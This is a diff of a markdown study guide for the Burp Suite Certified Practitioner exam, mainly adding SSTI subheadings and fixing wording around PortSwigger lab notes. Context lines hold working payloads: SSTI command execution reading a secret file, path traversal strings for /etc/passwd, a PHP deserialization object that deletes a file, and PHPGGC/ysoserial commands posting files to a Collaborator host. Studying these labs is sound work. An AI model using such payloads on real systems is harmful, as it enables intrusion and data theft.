@@ -427,7 +427,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```  
 
 + Using the **eval()** method evaluates or executes an argument. 
-+ Using **atob()** or **btoa()** is function used for encoding to and from base64 formated strings.
++ Using **atob()** or **btoa()** is function used for encoding to and from base64 format strings.
 + If **eval()** being blocked then Alternatives:
   + setTimeout("code")
   + setInterval("code)
@@ -1893,10 +1893,20 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 
 [PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
   
-## SSTI - Server Side Template Injection
+## SSTI - Server Side Template Injection  
+
+[SSTI Identified](#ssti-identified)  
+[Tornado](#tornado)  
+[Django](#django)  
+[Freemarker](#freemarker)  
+[ERB](#erb)  
+[Handlebars](#handlebars)  
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{input}}**, which is then executed server-side.  
->SSTI can be ***identified*** using the tool [SSTImap](https://github.com/vladko312/SSTImap) .  
+
+### SSTI Identified  
+
+>SSTI can be ***identified*** using the tool [SSTImap](https://github.com/vladko312/SSTImap). The limitations of this tool is that the template expression ```{{7*7}}``` results are sometimes only evaluated by another GET request or calling another function in the application, as the **output** is not directly reflected or echoed into the response where the template expression was posted. 
 
 ```bash
 python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
@@ -1933,7 +1943,9 @@ ${foobar}
 
 ![Identify SSTI](images/identify-ssti.png)  
 
->Tornado Template  
+### Tornado  
+
+>Tornado Template can be identified using a ```}}{{ 7*7}}``` payload that breakout of current expression and evaluate ```7*7```.  
 
 ```
 }}
@@ -1943,9 +1955,13 @@ ${foobar}
 blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
 ```  
 
+>The preferred name" functionality in the user account profile page is altered and on blog post comment the output displayed.  
+
 ![Tornado Template](images/tornado-template.png)  
 
 [PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  
+
+### Django  
 
 >Django Template  
 
@@ -1959,6 +1975,8 @@ ${{<%[%'"}}%\,
 
 [PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  
 
+### Freemarker  
+
 >Freemarker Template Content-Manager (C0nt3ntM4n4g3r)  
 
 ```
@@ -1970,6 +1988,7 @@ ${foobar}
 
 [PortSwigger Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)  
 
+### ERB  
 
 >ERB Template  
 
@@ -1982,6 +2001,7 @@ ${foobar}
 
 [PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  
 
+### Handlebars  
 
 >Handlebars Template  
 
@@ -2014,8 +2034,7 @@ wrtz{{#with "s" as |string|}}
 ![Handlebars template](images/handlebars-template.png)  
 
 [PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  
-
-
+  
 [PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  
 
 >Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
@@ -2027,7 +2046,7 @@ wrtz{{#with "s" as |string|}}
 1. Application blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with ```/etc/passwd```absolute path to target file payload.  
 2. Images on app is loaded using ```filename``` parameter, and is defending against traversal attacks by stripping path traversal. Exploit using ```....//....//....//....//etc/passwd``` payloads.  
 3. Using URL-encoded ```..%252f..%252f..%252fetc/passwd``` payload can bypass application security controls.  
-4. Leading the begining of the called filename with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
+4. Leading the beginning of the filename referenced with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
 5. Using a **null** byte character at end plus an image extension to fool APP controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
   
 >Corresponding Directory traversal labs.  
@@ -2175,7 +2194,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
   
 [PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
 
->**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using PHPGGC.  
+>**Note:** In BSCP exam not going to run this as it delete the file, but in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using PHPGGC.  
 
 ```
 ./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
@@ -2259,7 +2278,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 
 ![MicahVanDeusens-blog](images/MicahVanDeusens-blog.png)  
   
->The image below is my view of possible vulnerabilities to identify and exploit to reach the next BSCP exam stage and progress through the exam challenges.  
+>The image below is my view of possible vulnerabilities identified and exploitation to reach the next BSCP exam stage and progress through the exam challenges.  
 
 ![Three stages](images/3stages.png)  
   
@@ -2297,4 +2316,4 @@ Youtube channels:
   
 ## Support  
 
-[If you find the content valuable for Bug Bounty, Penetration Testing or Burp Exam studies, I will use the coffee funds to pay my next exam](https://www.buymeacoffee.com/botesjuan)  
+[If you find the content valuable for Bug Bounty, Penetration Testing or Burp Exam studies, I will appreciate sponsoring me 'coffee' funds to pay for my next exam](https://www.buymeacoffee.com/botesjuan)  
